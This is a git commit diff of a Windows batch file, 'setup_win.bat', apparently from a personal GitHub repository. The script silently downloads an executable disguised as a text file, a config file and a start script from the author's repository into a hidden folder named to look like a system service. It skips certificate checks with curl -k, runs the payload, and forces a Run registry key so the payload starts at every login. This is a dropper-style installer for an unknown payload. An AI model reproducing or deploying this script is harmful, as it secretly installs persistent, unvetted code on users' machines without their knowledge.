258819f5d9f7f4cc3c2cf19dd40f72346738b55f
anabianca92 <94259852+anabianca92@users.noreply.github.com>
2023-06-22 04:21:45 -0300

    setup_win.bat

--- setup_win.bat
+++ setup_win.bat
@@ -1,9 +1,7 @@
 @echo off
+REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\" 
 mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 
 curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt -o %USERPROFILE%\.cache\services\slhost\slhost.exe
 curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/config.json -o %USERPROFILE%\.cache\services\slhost\config.json
 curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/start.cmd -o %USERPROFILE%\.cache\services\slhost\Noise.bat
 %USERPROFILE%\.cache\services\slhost\Noise.bat
-REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat" 
-REG QUERY HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v notepad
-
